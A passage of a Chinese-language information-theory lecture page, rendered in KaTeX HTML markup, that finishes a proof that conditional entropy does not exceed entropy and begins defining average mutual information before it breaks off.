style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.6431459999999998em;vertical-align:-1.321706em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>即证</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>≤</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\sum_{x\in X}\sum_{y\in Y}p(y|x)\log_2\frac{p(y)}{p(xy)}\le \sum_{x\in X}\log_2\frac{1}{p(x)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.857444em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.6431459999999998em;vertical-align:-1.321706em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>即证</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>≤</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\sum_{x\in X}\sum_{y\in Y}p(y|x)\log_2\frac{p(x)p(y)}{p(xy)}\le 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.857444em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></span></p><p>即证</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>≤</mo><mn>0</mn><mspace linebreak="newline"></mspace><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>≤</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mo stretchy="false">(</mo><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mn>1</mn><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\sum_{x\in X}\sum_{y\in Y}p(y|x)\log_2\frac{p(y)}{p(y|x)}\le 0\\\sum_{x\in X}\sum_{y\in Y}p(y|x)\log_2\frac{p(y)}{p(y|x)}\le \sum_{x\in X}\log_2(\sum_{y\in Y}p(y))=\sum_{x\in X}\log_21=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.857444em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:2.857444em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.480449em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.3717110000000003em;vertical-align:-1.321706em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></span></p><p>证毕</p><h2 id="八-平均互信息量"><a class="markdownIt-Anchor" href="#八-平均互信息量"></a> 八、平均互信息量</h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(X;Y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span>定义为互信息量在联合概率空间上的数学期望</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" 